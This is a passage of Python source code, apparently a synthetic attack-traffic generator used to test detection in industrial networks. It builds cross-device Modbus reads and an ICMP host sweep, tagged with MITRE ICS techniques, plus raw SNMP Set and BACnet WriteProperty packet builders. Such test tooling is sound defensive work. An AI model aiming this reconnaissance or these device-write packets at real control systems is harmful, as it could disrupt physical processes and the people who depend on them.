    CV should detect: new communication pair, anomalous traffic pattern.
    """
    count = params.get("count", 5)
    interval_ms = params.get("interval_ms", 1000)
    target_type = params.get("target_type", "plc")

    if len(targets) < 2:
        return

    current_time = start_time_ms
    tid = random.randint(1, 65535)

    # Pick two random devices as source and destination
    src_device, dst_device = random.sample(targets[:min(len(targets), 5)], 2)

    for i in range(count):
        # Build a Modbus read request from one device to another
        pdu = struct.pack(">BHH", 0x03, random.randint(0, 1000), 10)
        payload = _build_mbap(tid, 1, pdu)
        pkt = _build_modbus_raw_packet(
            src_device.ip_address,
            dst_device.ip_address,
            payload,
        )
        yield _scapy_to_packet_event(current_time, pkt, "cross_device_comm", {
            "src_device": src_device.device_id,
            "dst_device": dst_device.device_id,
            "mitre_technique": "T0867",
        })
        tid = (tid + 1) & 0xFFFF
        current_time += interval_ms + random.randint(-100, 100)


# ---------------------------------------------------------------------------
# ICMP reconnaissance
# ---------------------------------------------------------------------------


@register_action("icmp_sweep")
def _icmp_sweep(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """ICMP echo request sweep — host discovery.

    CV should detect: ICMP sweep, network reconnaissance.
    """
    from scapy.layers.inet import ICMP

    interval_ms = params.get("interval_ms", 100)
    current_time = start_time_ms
    icmp_id = random.randint(0, 65535)

    for i, target in enumerate(targets):
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / ICMP(type=8, code=0, id=icmp_id, seq=i + 1)
        )
        yield _scapy_to_packet_event(current_time, pkt, "icmp_sweep", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0846",
        })
        current_time += interval_ms + random.randint(-10, 10)


# ---------------------------------------------------------------------------
# SNMP BER encoding helpers (minimal, for generating realistic wire traffic)
# ---------------------------------------------------------------------------


def _ber_encode_length(length: int) -> bytes:
    """BER length encoding."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])


def _ber_encode_integer(value: int) -> bytes:
    """BER integer encoding (tag 0x02)."""
    if value < 0x80:
        return bytes([0x02, 0x01, value & 0xFF])
    elif value < 0x8000:
        return bytes([0x02, 0x02, (value >> 8) & 0xFF, value & 0xFF])
    else:
        return bytes([0x02, 0x04,
                       (value >> 24) & 0xFF, (value >> 16) & 0xFF,
                       (value >> 8) & 0xFF, value & 0xFF])


def _ber_encode_string(s: str) -> bytes:
    """BER octet string encoding (tag 0x04)."""
    data = s.encode("ascii")
    return bytes([0x04]) + _ber_encode_length(len(data)) + data


def _ber_encode_oid(parts: list[int]) -> bytes:
    """BER OID encoding (tag 0x06)."""
    if len(parts) < 2:
        parts = parts + [0] * (2 - len(parts))
    oid_bytes = bytes([parts[0] * 40 + parts[1]])
    for p in parts[2:]:
        if p < 0x80:
            oid_bytes += bytes([p])
        elif p < 0x4000:
            oid_bytes += bytes([(p >> 7) | 0x80, p & 0x7F])
        else:
            oid_bytes += bytes([
                (p >> 14) | 0x80, ((p >> 7) & 0x7F) | 0x80, p & 0x7F
            ])
    return bytes([0x06]) + _ber_encode_length(len(oid_bytes)) + oid_bytes


def _build_snmp_get_bulk(
    community: str,
    request_id: int,
    oid_parts: list[int],
    max_repetitions: int = 10,
) -> bytes:
    """Build an SNMPv2c GetBulk-Request PDU."""
    # VarBind: OID + NULL value
    oid_enc = _ber_encode_oid(oid_parts)
    null_val = bytes([0x05, 0x00])  # ASN.1 NULL
    varbind = bytes([0x30]) + _ber_encode_length(len(oid_enc) + len(null_val)) + oid_enc + null_val
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind)) + varbind

    # GetBulk-Request PDU (tag 0xA5)
    req_id = _ber_encode_integer(request_id)
    non_repeaters = _ber_encode_integer(0)
    max_rep = _ber_encode_integer(max_repetitions)
    pdu_content = req_id + non_repeaters + max_rep + varbind_list
    pdu = bytes([0xA5]) + _ber_encode_length(len(pdu_content)) + pdu_content

    # SNMP message: version + community + PDU
    version = _ber_encode_integer(1)  # SNMPv2c
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


def _build_snmp_get_request(
    community: str,
    request_id: int,
    oid_parts: list[int],
) -> bytes:
    """Build an SNMPv2c Get-Request PDU."""
    oid_enc = _ber_encode_oid(oid_parts)
    null_val = bytes([0x05, 0x00])
    varbind = bytes([0x30]) + _ber_encode_length(len(oid_enc) + len(null_val)) + oid_enc + null_val
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind)) + varbind

    # Get-Request PDU (tag 0xA0)
    req_id = _ber_encode_integer(request_id)
    error_status = _ber_encode_integer(0)
    error_index = _ber_encode_integer(0)
    pdu_content = req_id + error_status + error_index + varbind_list
    pdu = bytes([0xA0]) + _ber_encode_length(len(pdu_content)) + pdu_content

    version = _ber_encode_integer(1)
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


def _build_snmp_set_request(
    community: str,
    request_id: int,
    oid_parts: list[int],
    value: str,
) -> bytes:
    """Build an SNMPv2c Set-Request PDU."""
    oid_enc = _ber_encode_oid(oid_parts)
    val_enc = _ber_encode_string(value)
    varbind = bytes([0x30]) + _ber_encode_length(len(oid_enc) + len(val_enc)) + oid_enc + val_enc
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind)) + varbind

    # Set-Request PDU (tag 0xA3)
    req_id = _ber_encode_integer(request_id)
    error_status = _ber_encode_integer(0)
    error_index = _ber_encode_integer(0)
    pdu_content = req_id + error_status + error_index + varbind_list
    pdu = bytes([0xA3]) + _ber_encode_length(len(pdu_content)) + pdu_content

    version = _ber_encode_integer(1)
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


def _build_snmp_v2c_trap(
    community: str,
    request_id: int,
    trap_oid_parts: list[int],
    uptime_cs: int,
) -> bytes:
    """Build an SNMPv2c Trap PDU (InformRequest-style)."""
    # VarBind 1: sysUpTime.0
    uptime_oid = _ber_encode_oid([1, 3, 6, 1, 2, 1, 1, 3, 0])
    # TimeTicks value (tag 0x43)
    uptime_bytes = struct.pack(">I", uptime_cs)
    uptime_val = bytes([0x43]) + _ber_encode_length(len(uptime_bytes)) + uptime_bytes
    vb1 = bytes([0x30]) + _ber_encode_length(len(uptime_oid) + len(uptime_val)) + uptime_oid + uptime_val

    # VarBind 2: snmpTrapOID.0
    trap_oid_enc = _ber_encode_oid([1, 3, 6, 1, 6, 3, 1, 1, 4, 1, 0])
    trap_val = _ber_encode_oid(trap_oid_parts)
    vb2 = bytes([0x30]) + _ber_encode_length(len(trap_oid_enc) + len(trap_val)) + trap_oid_enc + trap_val

    varbind_data = vb1 + vb2
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind_data)) + varbind_data

    # SNMPv2-Trap PDU (tag 0xA7)
    req_id = _ber_encode_integer(request_id)
    error_status = _ber_encode_integer(0)
    error_index = _ber_encode_integer(0)
    pdu_content = req_id + error_status + error_index + varbind_list
    pdu = bytes([0xA7]) + _ber_encode_length(len(pdu_content)) + pdu_content

    version = _ber_encode_integer(1)
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


# ---------------------------------------------------------------------------
# BACnet packet building helpers
# ---------------------------------------------------------------------------


def _build_bacnet_ip_frame(apdu: bytes, *, broadcast: bool = False) -> bytes:
    """Wrap a BACnet APDU in BVLC + NPDU for BACnet/IP transport."""
    # NPDU: version=1, control depends on broadcast
    if broadcast:
        npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])
    else:
        npdu = bytes([0x01, 0x04])  # version=1, expecting-reply
    total = 4 + len(npdu) + len(apdu)
    func = 0x0B if broadcast else 0x0A  # original-broadcast vs original-unicast
    bvlc = bytes([0x81, func, (total >> 8) & 0xFF, total & 0xFF])
    return bvlc + npdu + apdu


def _bacnet_encode_object_id(object_type: int, instance: int) -> bytes:
    """Encode a BACnet object identifier as 4 bytes (type:10 bits, instance:22 bits)."""
    value = ((object_type & 0x3FF) << 22) | (instance & 0x3FFFFF)
    return struct.pack(">I", value)


def _bacnet_context_tag(tag_number: int, data: bytes) -> bytes:
    """Build a BACnet context-specific tag with enclosed data."""
    length = len(data)
    if length < 5:
        return bytes([(tag_number << 4) | 0x08 | length]) + data
    else:
        return bytes([(tag_number << 4) | 0x0D, length]) + data


def _build_bacnet_read_property_apdu(
    invoke_id: int,
    object_type: int,
    instance: int,
    property_id: int,
) -> bytes:
    """Build a BACnet Confirmed-Request ReadProperty APDU."""
    # PDU type 0 = confirmed-request, service 12 = ReadProperty
    header = bytes([0x00, 0x04, invoke_id, 0x0C])  # max-segs=0, max-resp=1476
    # Context 0: objectIdentifier
    obj_id = _bacnet_encode_object_id(object_type, instance)
    tag0 = _bacnet_context_tag(0, obj_id)
    # Context 1: propertyIdentifier
    if property_id < 256:
        tag1 = _bacnet_context_tag(1, bytes([property_id]))
    else:
        tag1 = _bacnet_context_tag(1, struct.pack(">H", property_id))
    return header + tag0 + tag1


def _build_bacnet_write_property_apdu(
    invoke_id: int,
    object_type: int,
    instance: int,
    property_id: int,
    value: float,
) -> bytes:
    """Build a BACnet Confirmed-Request WriteProperty APDU."""
    # PDU type 0 = confirmed-request, service 15 = WriteProperty
    header = bytes([0x00, 0x04, invoke_id, 0x0F])
    # Context 0: objectIdentifier
    obj_id = _bacnet_encode_object_id(object_type, instance)
    tag0 = _bacnet_context_tag(0, obj_id)
    # Context 1: propertyIdentifier
    if property_id < 256:
        tag1 = _bacnet_context_tag(1, bytes([property_id]))
    else:
        tag1 = _bacnet_context_tag(1, struct.pack(">H", property_id))
    # Context 3: propertyValue (opening tag + REAL + closing tag)
    real_bytes = struct.pack(">f", value)
    # Application tag 4 = REAL, length 4
    app_real = bytes([0x44]) + real_bytes
    opening = bytes([(3 << 4) | 0x0E])  # context 3 opening tag
    closing = bytes([(3 << 4) | 0x0F])  # context 3 closing tag
    tag3 = opening + app_real + closing
    # Context 4: priority (optional, use 8 = manual operator)
    tag4 = _bacnet_context_tag(4, bytes([8]))
    return header + tag0 + tag1 + tag3 + tag4


def _build_bacnet_iam_apdu(
    device_instance: int,
    max_apdu: int = 1476,
    vendor_id: int = 0,
) -> bytes:
    """Build a BACnet Unconfirmed I-Am APDU."""
    # PDU type 1 = unconfirmed, service 0 = I-Am
    header = bytes([0x10, 0x00])
    # objectIdentifier (application tag 12, length 4)
    obj_id = _bacnet_encode_object_id(8, device_instance)  # type 8 = device
    app_obj = bytes([0xC4]) + obj_id
    # maxAPDUlength (application tag 2 = unsigned)
    if max_apdu < 256:
        app_max = bytes([0x21, max_apdu & 0xFF])
    else:
        app_max = bytes([0x22, (max_apdu >> 8) & 0xFF, max_apdu & 0xFF])
    # segmentationSupported (application tag 9 = enumerated, 0 = both)
    app_seg = bytes([0x91, 0x00])
    # vendorID (application tag 2 = unsigned)
    if vendor_id < 256:
        app_vendor = bytes([0x21, vendor_id & 0xFF])
    else:
        app_vendor = bytes([0x22, (vendor_id >> 8) & 0xFF, vendor_id & 0xFF])
    return header + app_obj + app_max + app_seg + app_vendor
